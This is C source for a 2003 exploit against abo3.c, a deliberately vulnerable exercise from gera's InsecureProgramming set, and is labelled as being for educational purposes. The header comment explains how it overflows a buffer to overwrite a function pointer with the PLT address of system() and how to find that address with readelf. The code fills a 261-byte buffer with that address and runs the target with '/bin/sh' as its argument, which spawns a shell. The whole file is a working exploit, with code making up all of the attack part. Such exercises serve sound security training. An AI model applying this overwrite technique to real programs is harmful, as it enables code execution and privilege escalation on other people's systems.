/*
 * $Id: abo3-ex2.c,v 1.1.1.1 2003/10/15 17:27:57 raptor Exp $
 *
 * abo3-ex2.c - abo3.c exploit, for educational purposes
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * See http://community.core-sdi.com/~gera/InsecureProgramming/
 *
 * This exploit changes the value of the function pointer void (*fn)(char*), 
 * making it to point to the system() address in PLT (Procedure Linkage Table) 
 * and supplying "/bin/sh" as argument. Use the following command to grab the 
 * correct address for your system: 
 *
 * $ readelf -a abo3 | grep system
 * 0804963c  00000207 R_386_JUMP_SLOT   0804834c   system
 *      2: 0804834c   729 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.0 (2)
 *     62: 0804834c   729 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.0
 *         ^^^^^^^^\__(this is the address you need)
 *
 * NOTE: on some systems sh(1), the command line interpreter used by the 
 * system() function, drops privileges before executing the supplied commands.
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF 	261			// 65*4 + 1
#define SYSTEM	0x0804834c		// system() address in PLT
#define CMD	"/bin/sh"		// arg for system()

int main(int argc, char *argv[])
{
	int i, system_addr = SYSTEM;
	char *arg[4], buf[BUF];
	int *ap; /* address pointer */

	fprintf(stderr, "Using system() address: 0x%X\n", system_addr);

	/* make the ap to point to the buffer */
	ap = (int *)(buf);

	/* place the system() address into the whole buffer */
	for (i = 0; i < BUF - 1; i += 4)
		*ap++ = system_addr;
	*ap = 0x0;

	arg[0] = "./abo3";
	arg[1] = buf;
	arg[2] = CMD;
	arg[3] = NULL;

	/* run the vulnerable program */
	execve(arg[0], arg, NULL);
	perror("execve");
}
